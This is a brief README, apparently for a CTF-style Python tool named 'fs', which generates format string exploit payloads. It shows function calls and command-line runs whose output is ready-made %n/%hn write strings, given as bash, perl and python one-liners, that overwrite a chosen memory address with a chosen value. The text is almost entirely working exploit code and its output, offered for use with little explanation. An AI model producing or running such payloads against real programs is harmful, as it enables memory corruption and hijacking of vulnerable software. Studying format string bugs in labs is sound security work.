# fs
Use this script to generate fromat string exploits with ease.

```python
from fs import *


print([one_by_one(0xffffc14c, 0xffffc6d0, 11)])
# ['L\xc1\xff\xffM\xc1\xff\xffN\xc1\xff\xffO\xc1\xff\xff%192x%11$n%246x%12$n%57x%13$n%14$n']
print([two_by_two(0xffffc14c, 0xffffc6d0, 11)])
# ['N\xc1\xff\xffL\xc1\xff\xff%50888x%12$hn%14639x%11$hn']
```

```sh
python fs.py ffffc14c ffffc6d0 11 one

    Format string is:
        bash: $(printf "\x4c\xc1\xff\xff\x4d\xc1\xff\xff\x4e\xc1\xff\xff\x4f\xc1\xff\xff%192x%11$n%246x%12$n%57x%13$n%14$n")
        perl: $(perl -e  'print "\x4c\xc1\xff\xff\x4d\xc1\xff\xff\x4e\xc1\xff\xff\x4f\xc1\xff\xff%192x%11$n%246x%12$n%57x%13$n%14$n"')
        python: $(python -c 'print "\x4c\xc1\xff\xff\x4d\xc1\xff\xff\x4e\xc1\xff\xff\x4f\xc1\xff\xff%192x%11$n%246x%12$n%57x%13$n%14$n"')

python fs.py ffffc14c ffffc6d0 11 two

    Format string is:
        bash: $(printf "\x4e\xc1\xff\xff\x4c\xc1\xff\xff%50888x%12$hn%14639x%11$hn")
        perl: $(perl -e  'print "\x4e\xc1\xff\xff\x4c\xc1\xff\xff%50888x%12$hn%14639x%11$hn"')
        python: $(python -c 'print "\x4e\xc1\xff\xff\x4c\xc1\xff\xff%50888x%12$hn%14639x%11$hn"')
```
